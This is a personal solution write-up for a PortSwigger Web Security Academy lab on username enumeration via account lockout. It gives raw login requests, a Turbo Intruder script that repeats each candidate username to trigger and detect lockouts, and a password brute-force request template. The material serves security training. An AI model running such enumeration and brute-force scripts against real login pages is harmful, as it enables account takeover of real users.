# Lab: Username enumeration via account lock

## Lab Description

This lab is vulnerable to **username enumeration**. It uses **account locking**, but this **contains a logic flaw**. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- Candidate usernames
- Candidate passwords

## Lab Solution


HTTP Request in the intruder with the username as a payload

```
POST /login HTTP/1.1
Host: 0a9f007a03cc92fd80593a7900980004.web-security-academy.net
Cookie: session=GtD0ZghEpRTHhcpnPchp5xRDadQCI0D4
Content-Length: 29
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a9f007a03cc92fd80593a7900980004.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9f007a03cc92fd80593a7900980004.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=%s&password=admin
```


Edited turbointruder script to not show results which contain Invalid username or password. If the response is different, account got locked.

Also multiplied each word in worlist 5 times.

```
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('/home/mexie/Documents/Learning/Certs/Portswigger/portswigger-web-security-academy/02. Authentication/usernames.txt'):
        for i in range(5):
            engine.queue(target.req, word.rstrip())

def NotMatchRegex(regex):
    m = re.compile(unicode(regex), re.UNICODE|re.DOTALL|re.MULTILINE|re.IGNORECASE)
    def decorator(func):
        def handleResponse(req, interesting):
            if not m.match(req.response):
                func(req, interesting)
        return handleResponse
    return decorator

@NotMatchRegex(r".*Invalid username or password.*")
def handleResponse(req, interesting):
    if interesting:
        table.add(req)

```

Password bruteforce test

```
POST /login HTTP/1.1
Host: 0a9e0085040b06c68036df35008b008f.web-security-academy.net
Cookie: session=GtD0ZghEpRTHhcpnPchp5xRDadQCI0D4
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a9e0085040b06c68036df35008b008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9e0085040b06c68036df35008b008f.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=announcements&password=%s
```
input_file="input.txt"; output_file="output.txt"; echo "\"password\" : [" > "$output_file"; while IFS= read -r word; do echo "    \"$word\"," >> "$output_file"; done < "$input_file"; echo "]" >> "$output_file"

```
```
